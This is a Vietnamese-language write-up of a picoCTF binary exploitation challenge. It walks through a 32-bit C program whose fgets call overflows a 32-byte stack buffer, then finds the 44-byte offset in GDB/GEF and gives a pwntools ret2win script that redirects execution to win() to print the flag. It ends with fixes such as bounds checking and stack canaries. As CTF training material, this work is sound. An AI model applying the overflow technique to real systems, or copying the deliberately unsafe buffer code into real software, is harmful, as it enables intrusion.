# PicoCTF 2026: Offset-Cycle

**Category:** Binary Exploitation  |
**Point:** 300 |

> The developer has learned their lesson from unsafe input functions and tried to secure the program by using fgets(). Unfortunately, they didn’t use it correctly. Can you still find a way to read the flag?
> 
```bash
nc dolphin-cove.picoctf.net <port>
```
Bạn cần truy cập vào thử thách trên pico để mở instance

## Tóm tắt
Thử thách được tạo ra với một file binary, code C cùng một server yêu cầu nhập input. Lỗ hổng Buffer Overflow dùng hàm ```fgets()``` đọc số lượng đầu vào lớn hơn buffer + Không Canaries vì vậy dùng kĩ thuật ret2win để khai thác ra flag

Writeup này được viết bởi chillfish

## 1. Static Reversing
### Chạy thử

Khi kết nối vào server, nó yêu cầu nhập secret key, nếu nhập số quá lớn sẽ đơ, còn không thì báo lại key vừa nhập
```bash
Enter the secret key: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbv

Enter the secret key: aaaaaaaaaaaaaaaaaaaaaaaaaaaa
You entered:, aaaaaaaaaaaaaaaaaaaaaaaaaaaa

Goodbye!
```
### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("[!] Could not open flag.txt");
        exit(1);
    }

    char flag[128];
    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fflush(stdout);
    fclose(fp);
}

void vuln() {
    char buf[32];

    printf("Enter the secret key: ");
    fflush(stdout);

    fgets(buf, 128, stdin);

    printf("You entered:, %s\n", buf);
}

int main() {
    vuln();
    puts("Goodbye!");
    return 0;
}
```
</details>

Bỏ qua những lệnh gọi thư viện, ta đến với function ```win()```,  nó mở ra đọc flag, nếu flag NULL (không tồn tại, không có quyền) sẽ in lỗi. Tiếp đến, đặt buffer 128bytes, dùng lệnh fgets đưa flag vào buffer với giới hạn kích thước dữ liệu là size của flag (sizeof(flag)). Cuối cùng dùng lệnh ```fflush(stdout)``` để đẩy hết đầu ra ngay lập tức mà không cần chờ chương trình chạy xong mới hiện (Khi BOF chương trình có thể terminated và lỗi toàn bộ khiến flag sẽ không được hiện ra)
```C
void win() {
    FILE *fp = fopen("flag.txt", "r");
    if (!fp) {
        perror("[!] Could not open flag.txt");
        exit(1);
    }

    char flag[128];
    fgets(flag, sizeof(flag), fp);
    printf("Flag: %s\n", flag);
    fflush(stdout);
    fclose(fp);
}
```
Hàm vuln sẽ là hàm được quan tâm nhất vì hàm main chỉ khai báo hàm này rồi exit. Đầu tiên đặt bộ đệm buf 32bytes, dùng fflush(stdout) để xuất dữ liệu ngay trước khi chương trình death, kế đến dùng lệnh fgets; trước tiên ta cần biết fgets là hàm sẽ đọc dữ liệu chuỗi chủ động cho đến khi gặp '\n', cấu trúc fgets sẽ là fgets(đích, giới hạn kích thước dữ liệu, nơi lấy) hoặc bạn có thể [xem thêm tại đây](https://www.geeksforgeeks.org/c/fgets-function-in-c/)

Như vậy ta có thể thấy fgets được cấp một giới hạn quá lớn (128) so với buf được cấp (32). Mặc du fgets nếu như biết sử dụng sizeof như hàm trên thì rất an toàn, còn nếu đặt như hiện tại sẽ tạo ra lỗ hổng Buffer Overflow, có thể dùng các kí tự rác đè lên bộ đệm buf rồi gán các giá trị đè qua saved ebp và return address để trỏ vào một địa chỉ mong muốn
```C
void vuln() {
    char buf[32];

    printf("Enter the secret key: ");
    fflush(stdout);

    fgets(buf, 128, stdin);

    printf("You entered:, %s\n", buf);
}
```
### Check bảo mật
Ta dùng lệnh ```checksec vuln``` để xem cơ chế bảo mật của bài này
```bash
[*] '/home/flrsh/workspace5/vuln'
    Arch:       i386-32-little      -> saved ebp chỉ có 4 bytes, và return address cũng 32bits
    RELRO:      Partial RELRO
    Stack:      No canary found     -> không custom Canary -> dễ bypass qua saved ebp -> ret2win
    NX:         NX enabled
    PIE:        No PIE (0x8048000)  -> không ngẫu nhiên địa chỉ -> dễ tính offset
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win

## 2. Dynamic Debugging
Sử dụng công cụ GDB, bằng lệnh gdb vuln để phân tích luồng thực thi bên trong code
### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x8049276**
```bash
gef➤  p win
$1 = {<text variable, no debug info>} 0x8049276 <win>
```
### vuln
Vì chìa khóa giải bài này nằm ở hàm vuln (nơi chứa bug và địa chỉ ebp cần thiết) ta sẽ dùng lệnh disas vuln để xem qua code của hàm này:
```bash
Dump of assembler code for function vuln:
   0x08049328 <+0>:     endbr32
   0x0804932c <+4>:     push   ebp
   0x0804932d <+5>:     mov    ebp,esp
   0x0804932f <+7>:     push   ebx
   0x08049330 <+8>:     sub    esp,0x24
   0x08049333 <+11>:    call   0x80491b0 <__x86.get_pc_thunk.bx>
   0x08049338 <+16>:    add    ebx,0x2cc8
   0x0804933e <+22>:    sub    esp,0xc
   0x08049341 <+25>:    lea    eax,[ebx-0x1fc7]
   0x08049347 <+31>:    push   eax
   0x08049348 <+32>:    call   0x80490d0 <printf@plt>
   0x0804934d <+37>:    add    esp,0x10
   0x08049350 <+40>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049356 <+46>:    mov    eax,DWORD PTR [eax]
   0x08049358 <+48>:    sub    esp,0xc
   0x0804935b <+51>:    push   eax
   0x0804935c <+52>:    call   0x80490e0 <fflush@plt>
   0x08049361 <+57>:    add    esp,0x10
   0x08049364 <+60>:    mov    eax,DWORD PTR [ebx-0x8]
   0x0804936a <+66>:    mov    eax,DWORD PTR [eax]
   0x0804936c <+68>:    sub    esp,0x4
   0x0804936f <+71>:    push   eax
   0x08049370 <+72>:    push   0x80
   0x08049375 <+77>:    lea    eax,[ebp-0x28]
   0x08049378 <+80>:    push   eax
   0x08049379 <+81>:    call   0x80490f0 <fgets@plt>
   0x0804937e <+86>:    add    esp,0x10
   0x08049381 <+89>:    sub    esp,0x8
   0x08049384 <+92>:    lea    eax,[ebp-0x28]
   0x08049387 <+95>:    push   eax
   0x08049388 <+96>:    lea    eax,[ebx-0x1fb0]
   0x0804938e <+102>:   push   eax
   0x0804938f <+103>:   call   0x80490d0 <printf@plt>
   0x08049394 <+108>:   add    esp,0x10
   0x08049397 <+111>:   nop
   0x08049398 <+112>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x0804939b <+115>:   leave
   0x0804939c <+116>:   ret
End of assembler dump.
```
Ồ đoạn này rất khả nghi, vì tôi không hiểu code asm lắm nên tôi sẽ diện phần này vào là offset tiềm năng (ebp-0x28), nhưng cần phải làm một số bước khác để tính toán chắc chắn offset của bài 
```bash
   0x08049375 <+77>:    lea    eax,[ebp-0x28]
   0x08049378 <+80>:    push   eax
   0x08049379 <+81>:    call   0x80490f0 <fgets@plt>
```
Để kiểm chứng, tôi dùng ```pattern create 60``` để tạo chuỗi số ngẫu nhiên 60bytes để gửi input
```bash
gef➤  pattern create 60
[+] Generating a pattern of 60 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
```
Tôi đặt breakpoint vào địa chỉ lệnh lea ở trên (b *vuln+77) và run chương trình (r), dùng ni(next instruction) rồi xem các thanh ghi eax, ebp bằng ```i r eax ebp```
```bash
gef➤  i r eax ebp
eax            0xffffcb80          0xffffcb80
ebp            0xffffcba8          0xffffcba8
```
eax giờ chứa địa chỉ tại ebp-0x28 nếu trừ thì chắc chắn ra 0x28 rồi, còn ebp thì ở định buffer thực ra ở bước này ta đã xác định được offset rồi, nhưng để thuyết phục hơn ta dùng một cách tính offset khác dễ dàng hơn bằng công cụ của GEF

Tôi dùng continue(c) để chạy đến đoạn nhập input, rồi nhập chuỗi tạo ban này và nhập vào. Sau khi nhập thì chương trình sẽ bị lỗi SIGSEGV
```bash
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x4c
$ebx   : 0x6161616a ("jaaa"?)
$ecx   : 0x0
$edx   : 0x0
$esp   : 0xffffcbb0  →  "maaanaaaoaaa\n"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0x080493f0  →  <__libc_csu_init+0000> endbr32
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcbb0│+0x0000: "maaanaaaoaaa\n"     ← $esp
0xffffcbb4│+0x0004: "naaaoaaa\n"
0xffffcbb8│+0x0008: "oaaa\n"
0xffffcbbc│+0x000c: 0xf7da000a  →  "e_uncompress"
0xffffcbc0│+0x0010: 0x00000000
0xffffcbc4│+0x0014: 0x00000000
0xffffcbc8│+0x0018: 0xf7dbeb59  →   add ebx, 0x1eb2db
0xffffcbcc│+0x001c: 0xf7da5c75  →   add esp, 0x10
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
Thanh ghi eip tôi thấy đã bị ghi đè ```$eip   : 0x6161616c ("laaa"?)``` (cái địa chỉ này là chứa return address đó), nhưng để tính offset chuẩn ta dùng thêm lệnh ```pattern search $eip```. Lệnh này có tác dụng dựa vào cái pattern create ban đầu và đếm các mốc (bạn thấy chuỗi được tạo có các chữ aaaabaaacaaa abcdef) để đưa ra offset chính xác đến một thanh ghi cụ thể (ở đây tôi chọn eip để chứng minh rằng kiến trúc 32 bit có saved ebp là 4 bytes)
```bash
gef➤  pattern search $eip
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```
Dựa vào cái l để tìm ra chính xác 44 bytes (là 0x28 + 4 bytes của saved ebp)

## 3. Chiến thuật khai thác
Vì bài này sử dụng server kết nối nên tôi sẽ sử dụng payload script để ghi đè địa chỉ win và nhận flag

### Payload
Dùng python cho tiện, gọn, lẹ
```python
from pwn import *

host = 'dolphin-cove.picoctf.net'
port = #port

p = remote(host, port)

win = p32(0x8049276)
payload = b'a'*40 + b'b'*4 + win

p.sendline(payload)

p.interactive()
```

Kết quả:
```bash
[+] Opening connection to dolphin-cove.picoctf.net on port 52321: Done
[*] Switching to interactive mode
Enter the secret key: You entered:, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbv\x92\x04\x08

Flag: picoCTF{}
[*] Got EOF while reading in interactive
```
Tự làm đi baby

## 4. Kết luận
Lỗ hổng: Buffer Overflow tại hàm vuln(). Sử dụng hàm fgets() có dữ liệu kích thước lớn hơn buf size

Hậu quả: Kẻ tấn công có thể dễ dàng kiểm soát luồng thực thi của chương trình. Bằng cách ghi đè 44 bytes để chiếm quyền điều khiển thanh ghi EIP (Return Address), = kỹ thuật ret2win để nhảy vào hàm win() và tiết lộ Flag

Giải pháp khắc phục:
* Sử dụng sizeof(buf) để đặt giới hạn kích thước tránh cho BOF
* Bật Stack Canaries để chương trình tự động kiểm tra tính toàn vẹn của Stack trước khi kết thúc hàm [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
* Bật PIE/ASLR: tra google
* Luôn thực hiện kiểm tra biên (Bounds Checking) đối với mọi dữ liệu đầu vào từ người dùng
